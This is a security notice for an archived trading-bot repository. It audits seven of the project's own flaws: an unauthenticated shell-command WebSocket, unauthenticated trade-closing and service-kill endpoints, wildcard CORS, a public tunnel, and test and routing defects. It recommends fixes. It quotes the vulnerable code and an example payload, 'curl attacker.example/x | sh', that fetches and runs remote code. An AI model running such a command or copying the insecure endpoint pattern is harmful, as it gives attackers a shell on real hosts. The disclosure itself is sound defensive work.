# Security Notice

This repository documents an abandoned 2026 trading project. It is published as an
honest record of what was built and what went wrong, including the security problems.

**All credentials that ever appeared in this repository have been rotated and redacted
before publication.** The redactions are marked with `<...>` placeholders.

---

## Known vulnerabilities in this codebase

These were found by auditing this project's own code. They are documented rather than
fixed because the project is archived and preserved as a record.

### 1. Unauthenticated remote command execution — CRITICAL

**File:** `dashboard_server.py`, lines 180–206

The dashboard exposes a WebSocket endpoint at `/ws/cmd` that executes shell commands
on the host:

```python
@router.websocket("/ws/cmd")                 # line 180
async def cmd_websocket(ws: WebSocket):
    await ws.accept()                          # line 182 - no authentication
    ...
    allowed = ["docker","curl","python","dir","cd","echo",
               "type","ping","ipconfig","netnetstat","tasklist",
               "venv\\Scripts\\python.exe","uvicorn"]   # lines 191-192
    if cmd.lower().startswith(allowed):       # line 193 - prefix match, not exact
        ...
        asyncio.create_subprocess_shell(cmd, shell=True)   # line 201
```

Three defects compound:

1. **No authentication.** `await ws.accept()` on line 182 admits any connection.
   There is no token, no origin check, no rate limit.
2. **Prefix matching.** Line 193 uses `str.startswith()` against an allowlist of
   prefixes, so `python -c "import os; os.system('...')"` passes the `python` prefix
   check and then runs arbitrary code.
3. **`shell=True`.** Line 201 passes the string to a shell, so `&&`, `|`, `;` and
   `>` are all live. `curl attacker.example/x | sh` satisfies the `curl` prefix and
   executes a remote payload.

**Impact:** anyone who can reach port 9000 has a shell on the host.

### 2. Unauthenticated position-closing endpoint — HIGH

**File:** `dashboard_server.py`, lines 216–244

`POST /shutdown` closes every open GLD and XAU/USD position:

```python
@router.post("/shutdown")                    # line 216
async def shutdown_all():
    """Close all open positions (GLD + XAU/USD) and halt the system"""  # line 218
```

There is no authentication check anywhere in the handler. Its own docstring
contradicts a comment elsewhere in the file that claims the dashboard is read-only.

### 3. Unauthenticated service termination — HIGH

**File:** `dashboard_server.py`, lines 261–277

`POST /stop_services` runs `taskkill /PID <pid> /F` against every service on ports
8001–8005. Also unauthenticated. A denial-of-service against the trading system.

### 4. Wildcard CORS — MEDIUM

**File:** `dashboard_server.py`, line 62

```python
allow_origins=["*"]
```

Any web page the browser visits can open a WebSocket to this server, which makes the
`/ws/cmd` issue reachable from a malicious page rather than requiring an attacker to
be on the network.

### 5. Public tunnel exposure — HIGH

`start_remote_dashboard.bat` launches a Cloudflare quick tunnel, which exposes port
9000 to the public internet. The tunnel prints its URL to the console; anyone with
the URL can reach the dashboard while it is open. Combined with finding #1, a public
tunnel and the wildcard CORS turn a local-only RCE into an internet-reachable one.

### 6. Non-hermetic tests depended on machine state

Two credential-guard tests in `tests/` only failed on the original machine because
`ALPACA_*_PAPER` environment variables had been set at the Windows registry level
(`HKCU:\Environment`) and leaked into every process. On a clean machine they passed.
A test suite whose result depends on ambient machine state is not a test suite.

### 7. Live-mode routing defect

`src/runtime/execution_router.py` (Stage 14) builds a `BrokerConfig` with the **live**
Alpaca URL and passes it to `AlpacaPaperBroker`, which stores the config and then
ignores it — `alpaca_paper_broker.py` hardcodes `paper=True` when constructing its
client. Setting `STRICT_MODE=false` with `ALLOW_LIVE_TRADING=true` therefore yields
**paper trading with no warning**. The system was safe by accident rather than by
design.

---

## What this means if you want to run this

**Do not expose the dashboard to a network, and never start the tunnel.** If you must
run it, bind to `127.0.0.1` only and do not forward the port.

The correct fixes, had the project continued, would have been:

1. Require a shared bearer token on `/ws/cmd`, `/shutdown` and `/stop_services`.
2. Replace `create_subprocess_shell(..., shell=True)` with `create_subprocess_exec`
   and an argv list, or drop the endpoint entirely.
3. Replace `startswith()` allowlisting with exact argv matching.
4. Restrict CORS to specific origins.
5. Have the broker honour its configured `base_url`, or raise if a live URL reaches a
   paper-only broker.
